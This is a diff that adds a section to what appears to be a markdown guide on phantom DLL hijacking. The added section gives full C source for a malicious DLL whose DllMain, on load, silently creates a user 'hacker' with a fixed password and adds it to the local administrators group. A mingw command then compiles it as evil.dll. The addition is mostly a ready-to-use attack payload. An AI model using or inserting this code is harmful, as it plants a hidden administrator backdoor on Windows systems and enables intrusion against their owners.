@@ -80,3 +80,25 @@ This technique enables adversaries to achieve persistence, escalate privileges,
 and evade detection by placing malicious DLLs in locations where the operating system expects to find
 certain libraries, even though these libraries were never present on the system.
 
+---
+
+## Compiling the dll:
+
+```
+#include <windows.h>
+#include <stdlib.h>
+
+BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
+    if (reason == DLL_PROCESS_ATTACH) {
+        WinExec("cmd.exe /c net user hacker Password123! /add && net localgroup administrators hacker /add", 0);
+    }
+    return TRUE;
+}
+```
+
+> Compile it:
+
+```shell
+x86_64-w64-mingw32-gcc -shared -o evil.dll evil.c
+```
+
